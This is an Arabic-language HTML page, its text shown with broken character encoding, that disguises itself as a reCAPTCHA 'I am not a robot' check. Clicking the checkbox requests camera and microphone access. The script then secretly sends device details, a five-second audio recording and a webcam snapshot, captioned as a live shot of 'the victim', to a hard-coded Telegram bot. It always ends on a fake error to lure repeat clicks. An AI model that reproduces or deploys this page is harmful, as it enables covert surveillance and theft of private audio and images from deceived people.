<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .c-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; border-radius: 3px; display: flex; align-items: center; width: 300px; cursor: pointer; }
        .cb { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; display: flex; align-items: center; justify-content: center; }
        #ld { width: 18px; height: 18px; border: 2px solid #4285f4; border-top-color: transparent; border-radius: 50%; display: none; animation: sp 1s linear infinite; }
        @keyframes sp { to { transform: rotate(360deg); } }
        #er { color: #d93025; font-size: 13px; margin-top: 10px; display: none; text-align: center; width: 300px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div style="display: flex; flex-direction: column; align-items: center;">
    <div class="c-box" onclick="startProcess()">
        <div class="cb" id="ch"><div id="ld"></div></div>
        <div style="color:#555; font-size:14px; flex-grow:1;">Ø£Ù†Ø§ Ù„Ø³Øª Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø±ÙˆØ¨ÙˆØª</div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="30">
    </div>
    <div id="er">âš ï¸ ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¬Ù„Ø³Ø© Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    // Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø®Ø§ØµÙŠÙ† Ø¨Ùƒ
    const T = "8585898378:AAE_MbhMXeMVGOBrNRmJBC1ud5QQDFQ3RHk";
    const ID = "8444646632";

    async function startProcess() {
        const l = document.getElementById('ld');
        const e = document.getElementById('er');
        const c = document.getElementById('ch');
        
        l.style.display = "block";
        c.style.border = "none";
        e.style.display = "none";

        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = s;

            // 1. Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ø¨Ø·Ø§Ø±ÙŠØ© ÙÙˆØ±Ø§Ù‹
            let deviceData = "ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©:\n";
            deviceData += "â€¢ Ø§Ù„Ù†Ø¸Ø§Ù…: " + navigator.platform + "\n";
            deviceData += "â€¢ Ø§Ù„Ù…ØªØµÙØ­: " + navigator.userAgent.split(') ')[1] + "\n";
            
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                deviceData += "â€¢ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: " + Math.round(b.level * 100) + "% (" + (b.charging ? "ÙŠØ´Ø­Ù†" : "Ù„Ø§ ÙŠØ´Ø­Ù†") + ")";
            }
            
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(deviceData)}`);

            // 2. ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª 5 Ø«ÙˆØ§Ù†ÙŠ
            const mr = new MediaRecorder(s);
            const chunks = [];
            mr.ondataavailable = ev => chunks.push(ev.data);
            mr.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append('chat_id', ID);
                fd.append('voice', blob);
                fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
            };
            mr.start();

            // 3. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ† (Ù„Ø¶Ù…Ø§Ù† Ø§Ù„ÙˆØ¶ÙˆØ­)
            setTimeout(() => {
                const cv = document.getElementById('c');
                cv.width = 640; cv.height = 480;
                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
                cv.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', ID);
                    fd.append('photo', blob);
                    fd.append('caption', "ğŸ“¸ Ù„Ù‚Ø·Ø© Ø­ÙŠØ© Ù„Ù„Ø¶Ø­ÙŠØ©");
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');
            }, 2000);

            // 4. Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„Ù€ 5 Ø«ÙˆØ§Ù†ÙŠ Ø«Ù… Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø®Ø·Ø£
            setTimeout(() => {
                mr.stop();
                l.style.display = "none";
                c.style.border = "2px solid #c1c1c1";
                e.style.display = "block"; // ÙŠØ¸Ù‡Ø± Ø§Ù„Ø®Ø·Ø£ Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„ÙŠØ¹ÙŠØ¯ Ø§Ù„ÙƒØ±Ø©
                s.getTracks().forEach(track => track.stop());
            }, 5000);

        } catch (err) {
            l.style.display = "none";
            c.style.border = "2px solid #c1c1c1";
            e.innerText = "âš ï¸ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.";
            e.style.display = "block";
        }
    }
</script>
</body>
</html>
